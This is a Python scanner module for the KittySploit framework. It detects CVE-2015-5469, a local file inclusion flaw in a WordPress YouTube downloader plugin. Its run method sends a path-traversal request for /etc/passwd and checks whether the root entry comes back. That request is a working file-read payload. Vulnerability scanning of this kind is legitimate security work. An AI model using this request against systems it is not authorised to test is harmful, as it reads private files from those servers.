#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress MDC YouTube Downloader 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress MDC YouTube Downloader 2.1.0 - Local File Inclusion Detection',
        'description': 'WordPress MDC YouTube Downloader 2.1.0 plugin is susceptible to local file inclusion. A remote attacker can read arbitrary files via a full pathname in the file parameter to includes/download.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'wp', 'lfi', 'mdc_youtube_downloader_project', 'wordpress', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.openwall.com/lists/oss-security/2015/07/10/5',
            'http://www.vapid.dhs.org/advisory.php?v=133',
            'http://www.openwall.com/lists/oss-security/2015/07/10/5',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-5469',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2015-5469',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="WordPress MDC YouTube Downloader 2.1.0 - Local File Inclusion detected",
                path='/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=/etc/passwd',
            )
            return True
        return False

